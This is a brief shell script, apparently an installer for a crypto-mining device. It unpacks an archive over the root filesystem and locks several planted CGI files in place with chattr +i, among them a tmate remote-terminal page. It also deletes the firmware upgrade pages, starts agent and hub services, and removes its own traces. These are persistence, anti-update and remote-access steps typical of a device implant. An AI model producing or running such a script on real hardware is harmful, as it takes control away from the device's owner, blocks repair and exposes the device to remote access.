#!/bin/sh

chattr -i /www/pages/cgi-bin/*

chattr -i /www/pages/*

chattr -i /home/*

tar -zxf ./sw.tar.gz -C / 

chattr +i /www/pages/cgi-bin/cgi1.cgi

chattr +i /www/pages/cgi-bin/cgi2.cgi

chattr +i /home/minerStatus.cgi

chattr +i /home/bmminer.sh

chattr +i /www/pages/cgi-bin/tmate.cgi

chattr +i /www/pages/kernelLog.html

chattr +i /www/pages/cgi-bin/get_kernel_log.cgi

chattr +i /www/pages/cgi-bin/get_kernel_log2.cgi

rm /www/pages/cgi-bin/upgrade.cgi

rm /www/pages/cgi-bin/upgrade_clear.cgi

/etc/init.d/agent.sh restart > /dev/null 2>&1

hub start > /dev/null 2>&1

rm ./sw.tar.gz

rm ./sw2.tar.gz

rm ./runme.sh

sleep 3s

cat /tmp/oke.json

